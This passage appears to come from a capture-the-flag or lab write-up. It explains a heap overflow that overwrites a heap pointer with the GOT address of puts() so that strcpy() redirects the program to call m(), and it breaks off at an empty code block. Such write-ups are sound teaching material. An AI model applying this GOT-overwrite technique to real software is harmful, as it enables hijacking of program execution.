Here we can see exactly where our two strings are saved. It is interesting to note that malloc not only maps the available allocations, it also uses the space to save a header that contains the exact address of the buffer.

This means that we can overwrite the pointer of the second array with the GOT address of `puts()`, so that the second `strcpy()` will write there. If we pass the address of the `m()` function, then we can effectively make the program call `m()` instead of `puts()`.

This is what the heap looks like with the correct payload:

```bash
